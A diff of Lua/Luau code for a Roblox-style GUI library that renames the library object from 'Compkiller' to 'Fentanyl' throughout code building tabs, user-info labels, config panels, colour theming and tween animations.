+		TabButtonScrollingFrame.Name = Fentanyl:_RandomString()
 		TabButtonScrollingFrame.Parent = TabButtons
 		TabButtonScrollingFrame.Active = true
 		TabButtonScrollingFrame.AnchorPoint = Vector2.new(0.5, 0.5)
@@ -5262,7 +5262,7 @@
 		UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
 		UIListLayout.Padding = UDim.new(0, 4)
 
-		Userinfo.Name = Compkiller:_RandomString()
+		Userinfo.Name = Fentanyl:_RandomString()
 		Userinfo.Parent = TabFrame
 		Userinfo.AnchorPoint = Vector2.new(0, 1)
 		Userinfo.BackgroundTransparency = 1.000
@@ -5271,7 +5271,7 @@
 		Userinfo.Position = UDim2.new(0, 0, 1, 0)
 		Userinfo.Size = UDim2.new(1, -25, 0, 60)
 
-		UserProfile.Name = Compkiller:_RandomString()
+		UserProfile.Name = Fentanyl:_RandomString()
 		UserProfile.Parent = Userinfo
 		UserProfile.BackgroundTransparency = 1.000
 		UserProfile.BorderColor3 = Color3.fromRGB(0, 0, 0)
@@ -5284,7 +5284,7 @@
 		UICorner_4.CornerRadius = UDim.new(1, 0)
 		UICorner_4.Parent = UserProfile
 
-		UserText.Name = Compkiller:_RandomString()
+		UserText.Name = Fentanyl:_RandomString()
 		UserText.Parent = Userinfo
 		UserText.BackgroundTransparency = 1.000
 		UserText.BorderColor3 = Color3.fromRGB(0, 0, 0)
@@ -5294,16 +5294,16 @@
 		UserText.ZIndex = 2
 		UserText.Font = Enum.Font.GothamMedium
 		UserText.Text = "Username"
-		UserText.TextColor3 = Compkiller.Colors.SwitchColor
+		UserText.TextColor3 = Fentanyl.Colors.SwitchColor
 		UserText.TextSize = 13.000
 		UserText.TextXAlignment = Enum.TextXAlignment.Left
 
-		table.insert(Compkiller.Elements.SwitchColor , {
+		table.insert(Fentanyl.Elements.SwitchColor , {
 			Element = UserText,
 			Property = 'TextColor3'
 		});
 
-		ExpireText.Name = Compkiller:_RandomString()
+		ExpireText.Name = Fentanyl:_RandomString()
 		ExpireText.Parent = Userinfo
 		ExpireText.BackgroundTransparency = 1.000
 		ExpireText.BorderColor3 = Color3.fromRGB(0, 0, 0)
@@ -5313,17 +5313,17 @@
 		ExpireText.ZIndex = 2
 		ExpireText.Font = Enum.Font.GothamMedium
 		ExpireText.Text = "0/0/0"
-		ExpireText.TextColor3 = Compkiller.Colors.SwitchColor
+		ExpireText.TextColor3 = Fentanyl.Colors.SwitchColor
 		ExpireText.TextSize = 13.000
 		ExpireText.TextTransparency = 0.500
 		ExpireText.TextXAlignment = Enum.TextXAlignment.Left
 
-		table.insert(Compkiller.Elements.SwitchColor , {
+		table.insert(Fentanyl.Elements.SwitchColor , {
 			Element = ExpireText,
 			Property = 'TextColor3'
 		});
 
-		TabMainFrame.Name = Compkiller:_RandomString()
+		TabMainFrame.Name = Fentanyl:_RandomString()
 		TabMainFrame.Parent = MainFrame
 		TabMainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
 		TabMainFrame.BackgroundTransparency = 1.000
@@ -5334,8 +5334,8 @@
 		TabMainFrame.Size = UDim2.new(1, 0, 1, 0)
 		TabMainFrame.ZIndex = 5
 
-		if Compkiller:_IsMobile() then
-			Compkiller:_AddDragBlacklist(TabButtons);
+		if Fentanyl:_IsMobile() then
+			Fentanyl:_AddDragBlacklist(TabButtons);
 		end;
 
 		WindowOpen:Connect(function(v)
@@ -5345,85 +5345,85 @@
 			end;
 
 			if v then
-				Compkiller:_Animation(MainFrame,TweenInfo.new(0.2),{
+				Fentanyl:_Animation(MainFrame,TweenInfo.new(0.2),{
 					Size = Config.Scale
 				})
 
-				Compkiller:_Animation(TabButtonScrollingFrame,TweenInfo.new(0.35),{
+				Fentanyl:_Animation(TabButtonScrollingFrame,TweenInfo.new(0.35),{
 					Position = UDim2.new(0.5, 0, 0.5, 0)
 				})
 
-				Compkiller:_Animation(CompLogo,TweenInfo.new(0.2),{
+				Fentanyl:_Animation(CompLogo,TweenInfo.new(0.2),{
 					ImageTransparency = 0
 				})
 
-				Compkiller:_Animation(WindowLabel,TweenInfo.new(0.2),{
+				Fentanyl:_Animation(WindowLabel,TweenInfo.new(0.2),{
 					TextTransparency = 0
 				})
 
-				Compkiller:_Animation(UserProfile,TweenInfo.new(0.2),{
+				Fentanyl:_Animation(UserProfile,TweenInfo.new(0.2),{
 					ImageTransparency = 0
 				})
 
-				Compkiller:_Animation(UserText,TweenInfo.new(0.2),{
+				Fentanyl:_Animation(UserText,TweenInfo.new(0.2),{
 					TextTransparency = 0
 				})
 
-				Compkiller:_Animation(ExpireText,TweenInfo.new(0.2),{
+				Fentanyl:_Animation(ExpireText,TweenInfo.new(0.2),{
 					TextTransparency = 0.5
 				})
 
-				Compkiller:_Animation(MainFrame,TweenInfo.new(0.2),{
+				Fentanyl:_Animation(MainFrame,TweenInfo.new(0.2),{
 					BackgroundTransparency = 0
 				})
 
-				Compkiller:_Animation(LineFrame1,TweenInfo.new(0.3),{
+				Fentanyl:_Animation(LineFrame1,TweenInfo.new(0.3),{
 					BackgroundTransparency = 0,
 					Size = UDim2.new(0, 20, 1, 0)
 				})
 
-				Compkiller:_Animation(TabFrame,TweenInfo.new(0.2),{
+				Fentanyl:_Animation(TabFrame,TweenInfo.new(0.2),{
 					BackgroundTransparency = TabFrameBaseTrans
 				})
 			else
-				Compkiller:_Animation(MainFrame,TweenInfo.new(0.2),{
+				Fentanyl:_Animation(MainFrame,TweenInfo.new(0.2),{
 					Size = UDim2.new(math.max(Config.Scale.X.Scale - 0.05,0) , Config.Scale.X.Offset - 10 , math.max(Config.Scale.Y.Scale - 0.05,0) , Config.Scale.Y.Offset - 10)
 				})
 
-				Compkiller:_Animation(TabButtonScrollingFrame,TweenInfo.new(0.35),{
+				Fentanyl:_Animation(TabButtonScrollingFrame,TweenInfo.new(0.35),{
 					Position = UDim2.new(1.5, 100, 0.5, 0)
 				})
 
-				Compkiller:_Animation(LineFrame1,TweenInfo.new(0.1),{
+				Fentanyl:_Animation(LineFrame1,TweenInfo.new(0.1),{
 					BackgroundTransparency = 1,
 					Size = UDim2.new(0, 1, 1, 0)
 				})
 
-				Compkiller:_Animation(CompLogo,TweenInfo.new(0.2),{
+				Fentanyl:_Animation(CompLogo,TweenInfo.new(0.2),{
 					ImageTransparency = 1
 				})
 
-				Compkiller:_Animation(WindowLabel,TweenInfo.new(0.2),{
+				Fentanyl:_Animation(WindowLabel,TweenInfo.new(0.2),{
 					TextTransparency = 1
 				})
 
-				Compkiller:_Animation(UserProfile,TweenInfo.new(0.2),{
+				Fentanyl:_Animation(UserProfile,TweenInfo.new(0.2),{
 					ImageTransparency = 1
 				})
 
-				Compkiller:_Animation(UserText,TweenInfo.new(0.2),{
+				Fentanyl:_Animation(UserText,TweenInfo.new(0.2),{
 					TextTransparency = 1
 				})
 
-				Compkiller:_Animation(ExpireText,TweenInfo.new(0.2),{
+				Fentanyl:_Animation(ExpireText,TweenInfo.new(0.2),{
 					TextTransparency = 1
 				})
 
-				Compkiller:_Animation(MainFrame,TweenInfo.new(0.2),{
+				Fentanyl:_Animation(MainFrame,TweenInfo.new(0.2),{
 					BackgroundTransparency = 1
 				})
 
-				Compkiller:_Animation(TabFrame,TweenInfo.new(0.1),{
+				Fentanyl:_Animation(TabFrame,TweenInfo.new(0.1),{
 					BackgroundTransparency = 1
 				})
 			end;
@@ -5433,40 +5433,40 @@
 			local Style = TweenInfo.new(0.45,Enum.EasingStyle.Quint);
 
 			if value then
-				Compkiller:_Animation(TabFrame , Style , {
+				Fentanyl:_Animation(TabFrame , Style , {
 					Size = UDim2.new(0, 185,1, 0)
 				});
 
-				Compkiller:_Animation(WindowLabel , Style , {
+				Fentanyl:_Animation(WindowLabel , Style , {
 					Position = UDim2.new(0, 60,0, 17),
 					TextTransparency = 0
 				});
 
-				Compkiller:_Animation(UserText , Style , {
+				Fentanyl:_Animation(UserText , Style , {
 					Position = UDim2.new(0, 55,0, 8),
 					TextTransparency = 0.1
 				});
 
-				Compkiller:_Animation(ExpireText , Style , {
+				Fentanyl:_Animation(ExpireText , Style , {
 					Position = UDim2.new(0, 55,0, 25),
 					TextTransparency = 0.5
 				});
 			else
-				Compkiller:_Animation(TabFrame , Style , {
+				Fentanyl:_Animation(TabFrame , Style , {
 					Size = UDim2.new(0, 85,1, 0)
 				});
 
-				Compkiller:_Animation(WindowLabel , Style , {
+				Fentanyl:_Animation(WindowLabel , Style , {
 					Position = UDim2.new(0, 60 + 25,0, 17),
 					TextTransparency = 1
 				});
 
-				Compkiller:_Animation(UserText , Style , {
+				Fentanyl:_Animation(UserText , Style , {
 					Position = UDim2.new(0, 55 + 25,0, 8),
 					TextTransparency = 1
 				});
 
-				Compkiller:_Animation(ExpireText , Style , {
+				Fentanyl:_Animation(ExpireText , Style , {
 					Position = UDim2.new(0, 55 + 25,0, 25),
 					TextTransparency = 1
 				});
@@ -5482,7 +5482,7 @@
 			local Frame = Instance.new("Frame")
 			local UIGradient = Instance.new("UIGradient")
 
-			Category.Name = Compkiller:_RandomString()
+			Category.Name = Fentanyl:_RandomString()
 			Category.Parent = TabButtonScrollingFrame
 			Category.BackgroundTransparency = 1.000
 			Category.BorderColor3 = Color3.fromRGB(0, 0, 0)
@@ -5490,11 +5490,11 @@
 			Category.ClipsDescendants = true
 			Category.Size = UDim2.new(1, -10, 0, 22)
 
-			if Compkiller:_IsMobile() then
-				Compkiller:_AddDragBlacklist(Category);
+			if Fentanyl:_IsMobile() then
+				Fentanyl:_AddDragBlacklist(Category);
 			end;
 
-			CategoryText.Name = Compkiller:_RandomString()
+			CategoryText.Name = Fentanyl:_RandomString()
 			CategoryText.Parent = Category
 			CategoryText.BackgroundTransparency = 1.000
 			CategoryText.BorderColor3 = Color3.fromRGB(0, 0, 0)
@@ -5503,26 +5503,26 @@
 			CategoryText.Size = UDim2.new(1, 200, 0, 10)
 			CategoryText.Font = Enum.Font.Gotham
 			CategoryText.Text = config.Name
-			CategoryText.TextColor3 = Compkiller.Colors.SwitchColor
+			CategoryText.TextColor3 = Fentanyl.Colors.SwitchColor
 			CategoryText.TextSize = 16.000
 			CategoryText.TextTransparency = 0.500
 			CategoryText.TextXAlignment = Enum.TextXAlignment.Left
 
-			table.insert(Compkiller.Elements.SwitchColor , {
+			table.insert(Fentanyl.Elements.SwitchColor , {
 				Element = CategoryText,
 				Property = 'TextColor3'
 			});
 
 			Frame.Parent = Category
 			Frame.AnchorPoint = Vector2.new(0.5, 1)
-			Frame.BackgroundColor3 = Compkiller.Colors.Highlight
+			Frame.BackgroundColor3 = Fentanyl.Colors.Highlight
 			Frame.BackgroundTransparency = 0.750
 			Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
 			Frame.BorderSizePixel = 0
 			Frame.Position = UDim2.new(0.5, 0, 1, 0)
 			Frame.Size = UDim2.new(1, 0, 0, 1)
 
-			table.insert(Compkiller.Elements.Highlight,{
+			table.insert(Fentanyl.Elements.Highlight,{
 				Element = Frame,
 				Property = "BackgroundColor3"
 			});
@@ -5534,19 +5534,19 @@
 
 			TabHover:Connect(function(bool)
 				if bool then
-					Compkiller:_Animation(CategoryText,Tween,{
+					Fentanyl:_Animation(CategoryText,Tween,{
 						TextTransparency = 0.500
 					});
 
-					Compkiller:_Animation(Frame,Tween,{
+					Fentanyl:_Animation(Frame,Tween,{
 						BackgroundTransparency = 0.750
 					});
 				else
-					Compkiller:_Animation(CategoryText,Tween,{
+					Fentanyl:_Animation(CategoryText,Tween,{
 						TextTransparency = 1
 					});
 
-					Compkiller:_Animation(Frame,Tween,{
+					Fentanyl:_Animation(Frame,Tween,{
 						BackgroundTransparency = 1
 					});
 				end;
@@ -5554,13 +5554,13 @@
 		end;
 
 		function WindowArgs:DrawContainerTab(TabConfig : ContainerTab)
-			TabConfig = Compkiller.__CONFIG(TabConfig,{
+			TabConfig = Fentanyl.__CONFIG(TabConfig,{
 				Name = "Tab",
 				Icon = "eye",
 			});
 
 			local Tween = TweenInfo.new(0.35,Enum.EasingStyle.Quint);
-			local TabOpenSignal = Compkiller.__SIGNAL(false);
+			local TabOpenSignal = Fentanyl.__SIGNAL(false);
 
 			local TabArgs = {
 				__Current = nil,
@@ -5575,7 +5575,7 @@
 			local Highlight = Instance.new("Frame")
 			local UICorner = Instance.new("UICorner")
 
-			TabButton.Name = Compkiller:_RandomString()
+			TabButton.Name = Fentanyl:_RandomString()
 			TabButton.Parent = TabButtonScrollingFrame
 			TabButton.BackgroundTransparency = 1.000
 			TabButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
@@ -5584,29 +5584,29 @@
 			TabButton.Size = UDim2.new(1, -10, 0, 32)
 			TabButton.ZIndex = 3
 
-			if Compkiller:_IsMobile() then
-				Compkiller:_AddDragBlacklist(TabButton);
+			if Fentanyl:_IsMobile() then
+				Fentanyl:_AddDragBlacklist(TabButton);
 			end;
 
-			Icon.Name = Compkiller:_RandomString()
+			Icon.Name = Fentanyl:_RandomString()
 			Icon.Parent = TabButton
 			Icon.AnchorPoint = Vector2.new(0, 0.5)
-			Icon.BackgroundColor3 = Compkiller.Colors.Highlight
+			Icon.BackgroundColor3 = Fentanyl.Colors.Highlight
 			Icon.BackgroundTransparency = 1.000
 			Icon.BorderColor3 = Color3.fromRGB(0, 0, 0)
 			Icon.BorderSizePixel = 0
 			Icon.Position = UDim2.new(0, 15, 0.5, 0)
 			Icon.Size = UDim2.new(0, 22, 0, 22)
 			Icon.ZIndex = 3
-			Icon.Image = Compkiller:_GetIcon(TabConfig.Icon);
-			Icon.ImageColor3 = Compkiller.Colors.Highlight
+			Icon.Image = Fentanyl:_GetIcon(TabConfig.Icon);
+			Icon.ImageColor3 = Fentanyl.Colors.Highlight
 
-			table.insert(Compkiller.Elements.Highlight,{
+			table.insert(Fentanyl.Elements.Highlight,{
 				Element = Icon,
 				Property = "ImageColor3"
 			});
 
-			TabNameLabel.Name = Compkiller:_RandomString()
+			TabNameLabel.Name = Fentanyl:_RandomString()
 			TabNameLabel.Parent = TabButton
 			TabNameLabel.AnchorPoint = Vector2.new(0, 0.5)
 			TabNameLabel.BackgroundTransparency = 1.000
@@ -5617,16 +5617,16 @@
 			TabNameLabel.ZIndex = 3
 			TabNameLabel.Font = Enum.Font.GothamMedium
 			TabNameLabel.Text = TabConfig.Name;
-			TabNameLabel.TextColor3 = Compkiller.Colors.SwitchColor
+			TabNameLabel.TextColor3 = Fentanyl.Colors.SwitchColor
 			TabNameLabel.TextSize = 15.000
 			TabNameLabel.TextXAlignment = Enum.TextXAlignment.Left
 
-			table.insert(Compkiller.Elements.SwitchColor , {
+			table.insert(Fentanyl.Elements.SwitchColor , {
 				Element = TabNameLabel,
 				Property = 'TextColor3'
 			});
 
-			Highlight.Name = Compkiller:_RandomString()
+			Highlight.Name = Fentanyl:_RandomString()
 			Highlight.Parent = TabButton
 			Highlight.AnchorPoint = Vector2.new(0.5, 0.5)
 			Highlight.BackgroundColor3 = Color3.fromRGB(161, 161, 161)
@@ -5647,7 +5647,7 @@
 			local Top = Instance.new("Frame")
 			local UIListLayout = Instance.new("UIListLayout")
 
-			ContainerTab.Name = Compkiller:_RandomString()
+			ContainerTab.Name = Fentanyl:_RandomString()
 			ContainerTab.Parent = TabMainFrame
 			ContainerTab.AnchorPoint = Vector2.new(0.5, 0.5)
 			ContainerTab.BackgroundTransparency = 1.000
@@ -5657,7 +5657,7 @@
 			ContainerTab.Size = UDim2.new(1, -15, 1, -15)
 			ContainerTab.ZIndex = 6
 
-			MainFrame.Name = Compkiller:_RandomString()
+			MainFrame.Name = Fentanyl:_RandomString()
 			MainFrame.Parent = ContainerTab
 			MainFrame.AnchorPoint = Vector2.new(0.5, 1)
 			MainFrame.BackgroundTransparency = 1.000
@@ -5668,7 +5668,7 @@
 			MainFrame.ZIndex = 6
 			MainFrame.ClipsDescendants = true
 
-			Top.Name = Compkiller:_RandomString()
+			Top.Name = Fentanyl:_RandomString()
 			Top.Parent = ContainerTab
 			Top.BackgroundTransparency = 1.000
 			Top.BorderColor3 = Color3.fromRGB(0, 0, 0)
@@ -5695,15 +5695,15 @@
 				if bool then
 					WindowArgs.SelectedTab = TabButton;
 
-					Compkiller:_Animation(Icon,Tween,{
+					Fentanyl:_Animation(Icon,Tween,{
 						ImageTransparency = 0,
 					});
 
-					Compkiller:_Animation(TabNameLabel,Tween,{
+					Fentanyl:_Animation(TabNameLabel,Tween,{
 						TextTransparency = 0
 					});
 
-					Compkiller:_Animation(Highlight,Tween,{
+					Fentanyl:_Animation(Highlight,Tween,{
 						BackgroundTransparency = 0.925
 					});
 
@@ -5713,15 +5713,15 @@
 						end;
 					end;
 				else
-					Compkiller:_Animation(Icon,Tween,{
+					Fentanyl:_Animation(Icon,Tween,{
 						ImageTransparency = 0.5
 					});
 
-					Compkiller:_Animation(TabNameLabel,Tween,{
+					Fentanyl:_Animation(TabNameLabel,Tween,{
 						TextTransparency = 0.5
 					});
 
-					Compkiller:_Animation(Highlight,Tween,{
+					Fentanyl:_Animation(Highlight,Tween,{
 						BackgroundTransparency = 1
 					});
 
@@ -5743,23 +5743,23 @@
 				Remote = TabOpenSignal
 			});
 
-			Compkiller:_Hover(TabButton,function()
+			Fentanyl:_Hover(TabButton,function()
 				if WindowArgs.SelectedTab ~= TabButton then
-					Compkiller:_Animation(Icon,Tween,{
+					Fentanyl:_Animation(Icon,Tween,{
 						ImageTransparency = 0.1
 					});
 
-					Compkiller:_Animation(TabNameLabel,Tween,{
+					Fentanyl:_Animation(TabNameLabel,Tween,{
 						TextTransparency = 0.1
 					});
 				end;
 			end , function()
 				if WindowArgs.SelectedTab ~= TabButton then
-					Compkiller:_Animation(Icon,Tween,{
+					Fentanyl:_Animation(Icon,Tween,{
 						ImageTransparency = 0.5
 					});
 
-					Compkiller:_Animation(TabNameLabel,Tween,{
+					Fentanyl:_Animation(TabNameLabel,Tween,{
 						TextTransparency = 0.5
 					});
 				end;
@@ -5769,55 +5769,55 @@
 
 			TabHover:Connect(function(bool)
 				if bool then
-					Compkiller:_Animation(TabButton,Tween,{
+					Fentanyl:_Animation(TabButton,Tween,{
 						Size = UDim2.new(1, -10, 0, 32)
 					});
 
-					Compkiller:_Animation(Icon,Tween,{
+					Fentanyl:_Animation(Icon,Tween,{
 						Position = UDim2.new(0, 15, 0.5, 0),
 						Size = UDim2.new(0, 22, 0, 22),
 					});
 
-					Compkiller:_Animation(TabNameLabel,Tween,{
+					Fentanyl:_Animation(TabNameLabel,Tween,{
 						Size = UDim2.new(0, 200, 0, 25),
 						Position = UDim2.new(0, 43, 0.5, 0)
 					});
 
-					Compkiller:_Animation(UICorner,Tween,{
+					Fentanyl:_Animation(UICorner,Tween,{
 						CornerRadius = UDim.new(0, 4)
 					});
 
-					Compkiller:_Animation(Highlight,Tween,{
+					Fentanyl:_Animation(Highlight,Tween,{
 						Size = UDim2.new(1, -17, 1, 0),
 						Position = UDim2.new(0.5, 0, 0.5, 0)
 					});
 				else
-					Compkiller:_Animation(UICorner,Tween,{
+					Fentanyl:_Animation(UICorner,Tween,{
 						CornerRadius = UDim.new(0, 10)
 					});
 
-					Compkiller:_Animation(TabButton,Tween,{
+					Fentanyl:_Animation(TabButton,Tween,{
 						Size = UDim2.new(1, -10, 0, 32)
 					});
 
-					Compkiller:_Animation(Icon,Tween,{
+					Fentanyl:_Animation(Icon,Tween,{
 						Position = UDim2.new(0, 12, 0.5, 0),
 						Size = UDim2.new(0, 20, 0, 20),
 					});
 
-					Compkiller:_Animation(TabNameLabel,Tween,{
+					Fentanyl:_Animation(TabNameLabel,Tween,{
 						Size = UDim2.new(0, 200, 0, 25),
 						Position = UDim2.new(0, 80, 0.5, 0)
 					});
 
-					Compkiller:_Animation(Highlight,Tween,{
+					Fentanyl:_Animation(Highlight,Tween,{
 						Size = UDim2.new(1, -10,1, 5),
 						Position = UDim2.new(0.5, 0, 0.5, 0)
 					});
 				end;
 			end);
 
-			Compkiller:_Input(TabButton,function()
+			Fentanyl:_Input(TabButton,function()
 				for i,v in next, WindowArgs.Tabs do
 					if v.Root == TabButton then
 						v.Remote:Fire(true);
@@ -5828,13 +5828,13 @@
 			end);
 
 			function TabArgs:DrawTab(TabConfig : TabConfig) -- Internal Tab
-				TabConfig = Compkiller.__CONFIG(TabConfig,{
+				TabConfig = Fentanyl.__CONFIG(TabConfig,{
 					Name = "Tab",
 					Type = "Double",
 					EnableScrolling = false,
 				});
 
-				local InternalSignal = Compkiller.__SIGNAL(false);
+				local InternalSignal = Fentanyl.__SIGNAL(false);
 				local Frame = Instance.new("Frame")
 				local UICorner = Instance.new("UICorner")
 				local UIStroke = Instance.new("UIStroke")
@@ -5843,9 +5843,9 @@
 				local TextLabel = Instance.new("TextLabel")
 
 				Frame.Parent = Top
-				Frame.BackgroundColor3 = Compkiller.Colors.BlockColor
+				Frame.BackgroundColor3 = Fentanyl.Colors.BlockColor
 
-				table.insert(Compkiller.Elements.BlockColor , {
+				table.insert(Fentanyl.Elements.BlockColor , {
 					Element = Frame,
 					Property = "BackgroundColor3"
 				});
@@ -5861,18 +5861,18 @@
 				UICorner.Parent = Frame
 
 				UIStroke.Transparency = 1.000
-				UIStroke.Color = Compkiller.Colors.StrokeColor
+				UIStroke.Color = Fentanyl.Colors.StrokeColor
 				UIStroke.Parent = Frame
 
-				table.insert(Compkiller.Elements.StrokeColor,{
+				table.insert(Fentanyl.Elements.StrokeColor,{
 					Element = UIStroke,
 					Property = "Color"
 				});
 
-				Highlight.Name = Compkiller:_RandomString()
+				Highlight.Name = Fentanyl:_RandomString()
 				Highlight.Parent = Frame
 				Highlight.AnchorPoint = Vector2.new(1, 0.5)
-				Highlight.BackgroundColor3 = Compkiller.Colors.Highlight
+				Highlight.BackgroundColor3 = Fentanyl.Colors.Highlight
 				Highlight.BackgroundTransparency = 1.000
 				Highlight.BorderColor3 = Color3.fromRGB(0, 0, 0)
 				Highlight.BorderSizePixel = 0
@@ -5880,7 +5880,7 @@
 				Highlight.Size = UDim2.new(0, 5, 0, 10)
 				Highlight.ZIndex = 11
 
-				table.insert(Compkiller.Elements.Highlight,{
+				table.insert(Fentanyl.Elements.Highlight,{
 					Element = Highlight,
 					Property = "BackgroundColor3"
 				});
@@ -5898,11 +5898,11 @@
 				TextLabel.ZIndex = 12
 				TextLabel.Font = Enum.Font.GothamMedium
 				TextLabel.Text = TabConfig.Name
-				TextLabel.TextColor3 = Compkiller.Colors.SwitchColor
+				TextLabel.TextColor3 = Fentanyl.Colors.SwitchColor
 				TextLabel.TextSize = 13.000
 				TextLabel.TextXAlignment = Enum.TextXAlignment.Left
 
-				table.insert(Compkiller.Elements.SwitchColor , {
+				table.insert(Fentanyl.Elements.SwitchColor , {
 					Element = TextLabel,
 					Property = 'TextColor3'
 				});
@@ -5921,38 +5921,38 @@
 
 					if bool then
 
-						Compkiller:_Animation(Highlight,TweenInfo.new(0.2),{
+						Fentanyl:_Animation(Highlight,TweenInfo.new(0.2),{
 							BackgroundTransparency = 0,
 							Size = UDim2.new(0, 5, 0, 10)
 						})
 
-						Compkiller:_Animation(Frame,TweenInfo.new(0.2),{
+						Fentanyl:_Animation(Frame,TweenInfo.new(0.2),{
 							BackgroundTransparency = 0
 						})
 
-						Compkiller:_Animation(UIStroke,TweenInfo.new(0.2),{
+						Fentanyl:_Animation(UIStroke,TweenInfo.new(0.2),{
 							Transparency = 0
 						})
 
-						Compkiller:_Animation(TextLabel,TweenInfo.new(0.2),{
+						Fentanyl:_Animation(TextLabel,TweenInfo.new(0.2),{
 							TextTransparency = 0
 						})
 					else
 
-						Compkiller:_Animation(Highlight,TweenInfo.new(0.2),{
+						Fentanyl:_Animation(Highlight,TweenInfo.new(0.2),{
 							BackgroundTransparency = 1,
 							Size = UDim2.new(0, 5, 0, 2)
 						})
 
-						Compkiller:_Animation(Frame,TweenInfo.new(0.2),{
+						Fentanyl:_Animation(Frame,TweenInfo.new(0.2),{
 							BackgroundTransparency = 1
 						})
 
-						Compkiller:_Animation(UIStroke,TweenInfo.new(0.2),{
+						Fentanyl:_Animation(UIStroke,TweenInfo.new(0.2),{
 							Transparency = 1
 						})
 
-						Compkiller:_Animation(TextLabel,TweenInfo.new(0.2),{
+						Fentanyl:_Animation(TextLabel,TweenInfo.new(0.2),{
 							TextTransparency = 0.5
 						})
 					end;
@@ -5975,7 +5975,7 @@
 
 				table.insert(TabArgs.Tabs,Id)
 
-				Compkiller:_Input(Frame,function()
+				Fentanyl:_Input(Frame,function()
 					for i,v in next , TabArgs.Tabs do
 						if v.Root == Frame then
 							TabArgs.__Current = v;
@@ -6045,13 +6045,13 @@
 		end;
 
 		function WindowArgs:DrawConfig(Configuration : TabConfigManager , Internal)
-			Configuration = Compkiller.__CONFIG(Configuration,{
+			Configuration = Fentanyl.__CONFIG(Configuration,{
 				Name = "Config",
 				Icon = "folder",
 				Config = nil
 			});
 
-			local TabOpenSignal = Compkiller.__SIGNAL(false);
+			local TabOpenSignal = Fentanyl.__SIGNAL(false);
 			local TabArgs = {};
 
 			-- Button --
@@ -6061,11 +6061,11 @@
 			local Highlight = Instance.new("Frame")
 			local UICorner = Instance.new("UICorner")
 
-			if Compkiller:_IsMobile() then
-				Compkiller:_AddDragBlacklist(TabButton);
+			if Fentanyl:_IsMobile() then
+				Fentanyl:_AddDragBlacklist(TabButton);
 			end;
 
-			TabButton.Name = Compkiller:_RandomString()
+			TabButton.Name = Fentanyl:_RandomString()
 			TabButton.Parent = TabButtonScrollingFrame
 			TabButton.BackgroundTransparency = 1.000
 			TabButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
@@ -6074,25 +6074,25 @@
 			TabButton.Size = UDim2.new(1, -10, 0, 32)
 			TabButton.ZIndex = 3
 
-			Icon.Name = Compkiller:_RandomString()
+			Icon.Name = Fentanyl:_RandomString()
 			Icon.Parent = TabButton
 			Icon.AnchorPoint = Vector2.new(0, 0.5)
-			Icon.BackgroundColor3 = Compkiller.Colors.Highlight
+			Icon.BackgroundColor3 = Fentanyl.Colors.Highlight
 			Icon.BackgroundTransparency = 1.000
 			Icon.BorderColor3 = Color3.fromRGB(0, 0, 0)
 			Icon.BorderSizePixel = 0
 			Icon.Position = UDim2.new(0, 15, 0.5, 0)
 			Icon.Size = UDim2.new(0, 22, 0, 22)
 			Icon.ZIndex = 3
-			Icon.Image = Compkiller:_GetIcon(Configuration.Icon);
-			Icon.ImageColor3 = Compkiller.Colors.Highlight
+			Icon.Image = Fentanyl:_GetIcon(Configuration.Icon);
+			Icon.ImageColor3 = Fentanyl.Colors.Highlight
 
-			table.insert(Compkiller.Elements.Highlight,{
+			table.insert(Fentanyl.Elements.Highlight,{
 				Element = Icon,
 				Property = "ImageColor3"
 			});
 
-			TabNameLabel.Name = Compkiller:_RandomString()
+			TabNameLabel.Name = Fentanyl:_RandomString()
 			TabNameLabel.Parent = TabButton
 			TabNameLabel.AnchorPoint = Vector2.new(0, 0.5)
 			TabNameLabel.BackgroundTransparency = 1.000
@@ -6103,16 +6103,16 @@
 			TabNameLabel.ZIndex = 3
 			TabNameLabel.Font = Enum.Font.GothamMedium
 			TabNameLabel.Text = Configuration.Name;
-			TabNameLabel.TextColor3 = Compkiller.Colors.SwitchColor
+			TabNameLabel.TextColor3 = Fentanyl.Colors.SwitchColor
 			TabNameLabel.TextSize = 15.000
 			TabNameLabel.TextXAlignment = Enum.TextXAlignment.Left
 
-			table.insert(Compkiller.Elements.SwitchColor , {
+			table.insert(Fentanyl.Elements.SwitchColor , {
 				Element = TabNameLabel,
 				Property = 'TextColor3'
 			});
 
-			Highlight.Name = Compkiller:_RandomString()
+			Highlight.Name = Fentanyl:_RandomString()
 			Highlight.Parent = TabButton
 			Highlight.AnchorPoint = Vector2.new(0.5, 0.5)
 			Highlight.BackgroundColor3 = Color3.fromRGB(161, 161, 161)
@@ -6153,7 +6153,7 @@
 			local UICorner_4 = Instance.new("UICorner")
 			local TextLabel = Instance.new("TextLabel")
 
-			TabConfig.Name = Compkiller:_RandomString()
+			TabConfig.Name = Fentanyl:_RandomString()
 			TabConfig.Parent = TabMainFrame
 			TabConfig.AnchorPoint = Vector2.new(0.5, 0.5)
 			TabConfig.BackgroundTransparency = 1.000
@@ -6163,12 +6163,12 @@
 			TabConfig.Size = UDim2.new(1, 0, 1, 0)
 			TabConfig.ZIndex = 6
 
-			ConfigList.Name = Compkiller:_RandomString()
+			ConfigList.Name = Fentanyl:_RandomString()
 			ConfigList.Parent = TabConfig
 			ConfigList.AnchorPoint = Vector2.new(0.5, 0)
-			ConfigList.BackgroundColor3 = Compkiller.Colors.BlockColor
+			ConfigList.BackgroundColor3 = Fentanyl.Colors.BlockColor
 
-			table.insert(Compkiller.Elements.BlockColor , {
+			table.insert(Fentanyl.Elements.BlockColor , {
 				Element = ConfigList,
 				Property = "BackgroundColor3"
 			});
@@ -6182,15 +6182,15 @@
 			UICorner.CornerRadius = UDim.new(0, 6)
 			UICorner.Parent = ConfigList
 
-			UIStroke.Color = Compkiller.Colors.StrokeColor
+			UIStroke.Color = Fentanyl.Colors.StrokeColor
 			UIStroke.Parent = ConfigList
 
-			table.insert(Compkiller.Elements.StrokeColor,{
+			table.insert(Fentanyl.Elements.StrokeColor,{
 				Element = UIStroke,
 				Property = "Color"
 			});
 
-			Header.Name = Compkiller:_RandomString()
+			Header.Name = Fentanyl:_RandomString()
 			Header.Parent = ConfigList
 			Header.BackgroundTransparency = 1.000
 			Header.BorderColor3 = Color3.fromRGB(0, 0, 0)
@@ -6198,7 +6198,7 @@
 			Header.Size = UDim2.new(1, 0, 0, 35)
 			Header.ZIndex = 9
 
-			SectionText.Name = Compkiller:_RandomString()
+			SectionText.Name = Fentanyl:_RandomString()
 			SectionText.Parent = Header
